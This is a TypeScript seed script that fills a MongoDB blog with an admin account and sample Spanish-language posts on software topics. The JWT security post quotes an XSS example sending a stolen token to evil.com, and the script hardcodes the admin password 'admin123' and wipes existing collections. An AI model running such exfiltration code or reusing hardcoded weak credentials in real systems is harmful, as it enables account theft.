// ============================================================
// Seed Script — Poblar base de datos con posts profesionales
// ============================================================

import mongoose from 'mongoose'
import dotenv from 'dotenv'
import bcrypt from 'bcryptjs'

// Cargar env
dotenv.config()

// Schemas inline (no dependen del código principal)
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true, lowercase: true },
  password: { type: String, required: true },
  role: { type: String, enum: ['admin'], default: 'admin' },
  createdAt: { type: Date, default: Date.now },
})

const postSchema = new mongoose.Schema(
  {
    title: { type: String, required: true },
    slug: { type: String, required: true, unique: true },
    content: { type: String, required: true },
    excerpt: { type: String },
    coverImage: { type: String, default: null },
    status: { type: String, enum: ['draft', 'published'], default: 'draft' },
    tags: { type: [String], default: [] },
    author: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
    publishedAt: { type: Date, default: null },
  },
  { timestamps: true }
)

const User = mongoose.model('User', userSchema)
const Post = mongoose.model('Post', postSchema)

async function seed() {
  const mongoUri = process.env.MONGO_URI!
  console.log(`🔌 Conectando a ${mongoUri}...`)
  await mongoose.connect(mongoUri)
  console.log('✅ Conectado\n')

  // Limpiar datos existentes
  console.log('🧹 Limpiando colección existente...')
  await User.deleteMany({})
  await Post.deleteMany({})

  // Crear admin
  console.log('👤 Creando usuario admin...')
  const hashedPassword = await bcrypt.hash('admin123', 12)
  const admin = await User.create({
    username: 'admin',
    password: hashedPassword,
    role: 'admin',
  })
  console.log('✅ Admin creado:')
  console.log('   username: admin')
  console.log('   password: admin123\n')

  // Crear posts de ejemplo
  console.log('📝 Creando posts de ejemplo...')

  const posts = [
    // ==============================
    // POSTS PUBLICADOS (5)
    // ==============================
    {
      title: 'Clean Architecture en Node.js: Por qué importa',
      slug: 'clean-architecture-nodejs',
      content: `# Clean Architecture en Node.js: Por qué importa

Cuando empecé a escribir código, mis aplicaciones eran un solo archivo gigante. Funcionaba, sí. Pero cuando necesitaba cambiar algo, era un quilombo.

## El Problema

Imaginá que tenés un endpoint que crea un usuario. Si la lógica de negocio, la validación, y la llamada a la base de datos están todas mezcladas en el mismo archivo, cambiás una cosa y se rompe otra.

## La Solución: Separar por Capas

Clean Architecture propone separar el código en capas con responsabilidades claras:

\`\`\`
Routes → Controllers → Services → Models
\`\`\`

Cada capa solo conoce a la siguiente. Si mañana cambio MongoDB por PostgreSQL, solo modifico la capa de Models. El resto del código no se entera.

## Ejemplo Práctico

\`\`\`typescript
// Service (lógica de negocio)
class UserService {
  async create(data: CreateUserDTO): Promise<User> {
    const existing = await this.repository.findByEmail(data.email)
    if (existing) throw new ConflictError('Email ya registrado')
    return this.repository.create(data)
  }
}

// Controller (solo traduce HTTP → Service)
class UserController {
  async create(req: Request, res: Response) {
    const user = await this.service.create(req.body)
    res.status(201).json(user)
  }
}
\`\`\`

## Conclusión

No es over-engineering. Es invertir tiempo ahora para ahorrar quilombo después. Cuando el proyecto crece, los que aplicaron Clean Architecture siguen programando. Los que no, están refactorizando.

**Lee sobre esto**: "Clean Architecture" de Robert C. Martin.`,
      excerpt: 'Cuando empecé a escribir código, mis aplicaciones eran un solo archivo gigante. Clean Architecture resuelve eso separando por capas.',
      coverImage: 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200',
      status: 'published',
      tags: ['arquitectura', 'nodejs', 'typescript'],
      author: admin._id,
      publishedAt: new Date('2024-01-10'),
    },
    {
      title: 'TypeScript no es solo "agregar tipos"',
      slug: 'typescript-mas-que-tipos',
      content: `# TypeScript no es solo "agregar tipos"

Muchos desarrolladores piensan que TypeScript es JavaScript con tipos. Eso es como decir que React es solo "HTML con JavaScript". Es una simplificación que te hace perder lo más valioso.

## Interfaces como Contratos

\`\`\`typescript
interface APIResponse<T> {
  data: T
  status: 'success' | 'error'
  timestamp: number
}

interface User {
  id: string
  name: string
  email: string
}
\`\`\`

Las interfaces definen qué datos esperás. Si el backend cambia la estructura, TypeScript te avisa ANTES de que el código explote en producción.

## Discriminated Unions

\`\`\`typescript
type Result<T> =
  | { success: true; data: T }
  | { success: false; error: string }

function handleResult<T>(result: Result<T>) {
  if (result.success) {
    // TypeScript sabe que result.data existe
    console.log(result.data)
  } else {
    // TypeScript sabe que result.error existe
    console.error(result.error)
  }
}
\`\`\`

## Generics para Código Reutilizable

\`\`\`typescript
function paginate<T>(items: T[], page: number, limit: number): T[] {
  const start = (page - 1) * limit
  return items.slice(start, start + limit)
}
\`\`\`

La misma función funciona con Users, Posts, Products, o cualquier array.

## Conclusión

TypeScript no es burocracia. Es un sistema que detecta errores en compile time en vez de runtime. En un blog personal eso es opcional. En un proyecto profesional, es la diferencia entre dormir tranquilo y recibir llamadas a las 3 AM.`,
      excerpt: 'Muchos piensan que TypeScript es JavaScript con tipos. Eso te hace perder lo más valioso: interfaces, discriminated unions y generics.',
      coverImage: 'https://images.unsplash.com/photo-1516116216624-53e697fedbea?w=1200',
      status: 'published',
      tags: ['typescript', 'frontend', 'buenas-practicas'],
      author: admin._id,
      publishedAt: new Date('2024-01-20'),
    },
    {
      title: 'Next.js App Router: SSG, ISR y Server Components',
      slug: 'nextjs-app-router',
      content: `# Next.js App Router: SSG, ISR y Server Components

Cuando decidí construir este blog, tenía varias opciones: Hugo, Astro, WordPress, un SPA con React puro. Elegí Next.js 14 con App Router. Te cuento por qué.

## El Problema de los SPAs

React puro renderiza todo en el navegador. Eso significa:
- El usuario ve una página en blanco mientras descarga JavaScript
- Google no puede indexar tu contenido (mal SEO)
- Performance pobre en móviles

## Server Components: El Cambio de Paradigma

\`\`\`tsx
// Esto corre en el SERVIDOR, no en el navegador
export default async function HomePage() {
  const posts = await getPosts() // Llamada directa a la API
  return <PostGrid posts={posts} />
}
\`\`\`

Los Server Components eliminan la necesidad de useEffect + fetch + loading states. Los datos llegan pre-renderizados al navegador.

## SSG + ISR: Lo Mejor de Dos Mundos

\`\`\`tsx
export const revalidate = 60 // Re-genera cada 60 segundos
\`\`\`

- **SSG**: La página se genera una vez y se cachea. Ultra-rápido.
- **ISR**: Cada 60 segundos, se regenera silenciosamente. El usuario siempre ve contenido fresco.

Sin rebuild. Sin deploy. Sin downtime.

## Cuándo No Usar Next.js

- Apps internas sin SEO (React puro + Vite es suficiente)
- Sitios estáticos simples (Hugo o Astro son más rápidos)
- Proyectos donde la complejidad no justifica los beneficios

## Conclusión

Next.js no es la respuesta para todo. Pero para un blog o un sitio público donde SEO importa, es imbatible. El App Router de v14 hace que Server Components sean la norma, no la excepción.

**Elegí la herramienta según el problema, no según la moda.**`,
      excerpt: 'React puro renderiza todo en el navegador. Eso significa página en blanco, mal SEO, y performance pobre. Next.js lo resuelve.',
      coverImage: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1200',
      status: 'published',
      tags: ['nextjs', 'react', 'performance'],
      author: admin._id,
      publishedAt: new Date('2024-02-05'),
    },
    {
      title: 'JWT en 2024: Lo que los tutoriales no te cuentan',
      slug: 'jwt-seguridad-real',
      content: `# JWT en 2024: Lo que los tutoriales no te cuentan

Si seguiste cualquier tutorial de autenticación JWT, probablemente guardás el token en localStorage. Eso era aceptable en 2018. En 2024, es una vulnerabilidad.

## El Problema: XSS

Cualquier script malicioso que se inyecte en tu página puede leer localStorage:

\`\`\`javascript
// Un atacante ejecuta esto en tu página
const token = localStorage.getItem('jwt')
fetch('https://evil.com/steal?token=' + token)
\`\`\`

Tu token se roba. El atacante accede a tu cuenta. Fin de la historia.

## La Solución: HttpOnly Cookies

\`\`\`typescript
res.cookie('auth_token', jwt, {
  httpOnly: true,    // JavaScript no puede leerlo
  sameSite: 'strict', // Solo se envía en tu dominio
  secure: true,       // Solo HTTPS en producción
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 días
})
\`\`\`

El browser guarda la cookie, pero JavaScript NO puede acceder a ella. El XSS pierde poder.

## SameSite: La Capa Extra

\`SameSite: 'strict'\` significa que la cookie solo se envía cuando navegás dentro de tu dominio. Un atacante que intente hacer un request desde otro sitio no recibirá tu cookie.

## Refresh Tokens: ¿Necesarios?

Para un blog con 1 admin: No. Un JWT de 7 días es suficiente.
Para una app bancaria: Sí. JWT corto (15 min) + refresh token rotativo.

## Conclusión

La seguridad no es opcional. Lo que aprendés en tutoriales de YouTube tiene fecha de vencimiento. Investigá, actualizá tus prácticas, y no copies código sin entender las implicancias.

**Si tu blog tiene JWT en localStorage, un atacante puede publicar en tu nombre.**`,
      excerpt: 'Si seguiste cualquier tutorial JWT, probablemente guardás el token en localStorage. En 2024, eso es una vulnerabilidad.',
      coverImage: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200',
      status: 'published',
      tags: ['seguridad', 'jwt', 'nodejs'],
      author: admin._id,
      publishedAt: new Date('2024-02-15'),
    },
    {
      title: 'Zustand vs Redux: ¿Por qué elegí lo simple?',
      slug: 'zustand-vs-redux',
      content: `# Zustand vs Redux: ¿Por qué elegí lo simple?

En mis primeros proyectos usé Redux. Funcionaba, pero cada feature nueva requería:
- Crear un slice
- Crear actions
- Crear reducers
- Configurar el store
- Agregar el Provider al root

Eran 5 archivos para manejar un booleano de "isSidebarOpen".

## Zustand: State Management sin Boilerplate

\`\`\`typescript
import { create } from 'zustand'

interface AuthState {
  isAuthenticated: boolean
  username: string | null
  login: (username: string, password: string) => Promise<boolean>
  logout: () => void
}

export const useAuthStore = create<AuthState>((set) => ({
  isAuthenticated: false,
  username: null,

  login: async (username, password) => {
    const res = await fetch('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({ username, password }),
    })
    if (res.ok) {
      set({ isAuthenticated: true, username })
      return true
    }
    return false
  },

  logout: () => set({ isAuthenticated: false, username: null }),
}))
\`\`\`

Un archivo. Sin Provider. Sin boilerplate. Y tiene persistencia automática:

\`\`\`typescript
export const useAuthStore = create(
  persist(
    (set) => ({ ... }),
    { name: 'auth-storage' }
  )
)
\`\`\`

## ¿Cuándo usar Redux?

- Apps con +50 acciones y middleware complejo
- Teams grandes que necesitan convenciones estrictas
- Proyectos que ya tienen Redux (no migres por gusto)

## Conclusión

Redux es poderoso. Pero para el 90% de los proyectos, Zustand es suficiente. No uses un framework enterprise para una app que tiene 3 stores.

**La mejor herramienta es la que resuelve tu problema sin crear nuevos.**`,
      excerpt: 'Redux requería 5 archivos para manejar un booleano. Zustand resuelve lo mismo en un archivo sin boilerplate.',
      coverImage: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=1200',
      status: 'published',
      tags: ['react', 'state-management', 'zustand'],
      author: admin._id,
      publishedAt: new Date('2024-03-01'),
    },

    // ==============================
    // POSTS EN BORRADOR (2)
    // ==============================
    {
      title: 'API REST vs GraphQL: ¿Cuándo usar cada uno?',
      slug: 'rest-vs-graphql',
      content: `# API REST vs GraphQL: ¿Cuándo usar cada uno?

Estoy preparando un artículo comparando REST y GraphQL con ejemplos reales. Spoiler: no hay uno mejor que otro. Depende del caso de uso.

## Temas que voy a cubrir:

- Over-fetching y under-fetching
- Type safety en GraphQL
- REST con TypeScript DTOs
- Performance comparativa
- Casos de uso reales

[Artículo en progreso]`,
      excerpt: 'Comparando REST y GraphQL con ejemplos reales. Depende del caso de uso.',
      coverImage: 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=1200',
      status: 'draft',
      tags: ['api', 'backend', 'comparativa'],
      author: admin._id,
    },
    {
      title: 'Docker para Desarrollo: Más allá del "docker run"',
      slug: 'docker-desarrollo',
      content: `# Docker para Desarrollo: Más allá del "docker run"

Quiero escribir sobre cómo usar Docker efectivamente en desarrollo local. No solo correr containers, sino orquestar tu stack completo.

## Temas planeados:

- Docker Compose para full-stack apps
- Hot reload con volumes
- Networking entre containers
- Optimización de imágenes multi-stage
- Trucos para Windows (que es mi entorno)

[Borrador - próximamente]`,
      excerpt: 'Cómo usar Docker efectivamente en desarrollo local, más allá del docker run básico.',
      coverImage: 'https://images.unsplash.com/photo-1605745341112-85968b19335b?w=1200',
      status: 'draft',
      tags: ['docker', 'devops', 'desarrollo'],
      author: admin._id,
    },
  ]

  for (const postData of posts) {
    const post = await Post.create(postData)
    const icon = post.status === 'published' ? '🟢' : '🟡'
    console.log(`${icon} "${post.title}" [${post.status}]`)
  }

  const published = posts.filter((p) => p.status === 'published').length
  const drafts = posts.filter((p) => p.status === 'draft').length

  console.log('\n🎉 Seed completado!')
  console.log(`\n📋 Resumen:`)
  console.log(`   - 1 usuario admin (admin / admin123)`)
  console.log(`   - ${published} posts publicados`)
  console.log(`   - ${drafts} posts en borrador`)
  console.log(`\n   🌐 Blog: http://localhost:3000`)
  console.log(`   🔧 Admin: http://localhost:3000/admin/login`)

  await mongoose.disconnect()
  console.log('\n🔌 Desconectado de MongoDB')
}

seed().catch((error) => {
  console.error('❌ Error en seed:', error)
  process.exit(1)
})
